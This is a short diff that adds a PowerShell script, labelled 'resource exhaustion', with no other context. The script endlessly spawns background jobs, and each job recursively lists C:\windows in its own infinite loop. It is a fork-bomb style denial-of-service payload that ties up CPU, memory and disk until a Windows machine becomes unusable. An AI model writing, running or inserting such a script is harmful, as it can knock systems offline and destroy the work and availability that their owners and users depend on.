@@ -1,0 +1,3 @@
+#resource exhaustion
+
+while(1 -eq 1){start-job{while(1 -eq 1){$data = ls -recurse C:\windows}}}
